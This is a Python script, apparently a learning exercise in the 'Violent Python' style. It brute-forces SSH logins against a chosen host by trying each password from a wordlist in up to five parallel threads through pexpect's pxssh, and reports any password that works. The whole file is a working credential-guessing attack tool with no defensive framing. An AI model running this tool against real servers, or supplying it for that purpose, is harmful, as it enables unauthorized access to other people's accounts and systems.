from pexpect import pxssh
import argparse
import time
from threading import *
import logging

logging.basicConfig(level=logging.DEBUG)
maxConnections=5
connectionLock=BoundedSemaphore(value=maxConnections)

found=False
fails=0

def connect(host, user, password, release):
    global found
    global fails
    
    try:
        s=pxssh.pxssh()
        s.login(host, user, password)
        print('[+]Password Found: ' + password)
        found=True
        print('Found in CONNECT: {}'.format(found))
    except Exception as e:
        print(e)
        if 'read_nonblocking' in str(e):
              logging.debug('Now in if statement')
              fails+=1
              time.sleep(5)
              connect(host, user, password, False)

        elif 'synchronize with original prompt' in str(e):
              logging.debug('Now in elif')
              time.sleep(1)
              connect(host, user, password, False)
        '''else:
              logging.debug('Now in else')
              time.sleep(1)
              connect(host, user, password, False)
              print(e)'''
    finally:
        if release: connectionLock.release()

def main():
    logging.debug('Now in the main method')
    parser=argparse.ArgumentParser(description='usage prog -H <target host> -u <user> -F <password list>')
    parser.add_argument('-H', dest='tgtHost', type=str, help='specify target host')
    parser.add_argument('-F', dest='passwdFile', type=str, help='specify password file')
    parser.add_argument('-u', dest='user', type=str, help='specify the user')

    args=parser.parse_args()
    host=args.tgtHost
    passwdFile=args.passwdFile
    user=args.user

    if host==None or passwdFile==None or user==None:
        parser.print_help()
        exit(0)
    
    fn=open(passwdFile, 'r')
    for line in fn.readlines():
        if found:
            print('Found in MAIN: {}'.format(found))
            print('[*]Exiting: Password Found')
            exit(0)
        if fails>5:
            print('[!]Exiting: Too many socket timeouts')
            exit(0)
        connectionLock.acquire()
        password=line.strip('\r').strip('\n')
        print('[-]Testing: {}'.format(password))
        t=Thread(target=connect, args=(host, user, password, True))
        child=t.start()        

if __name__=='__main__':
                 main()

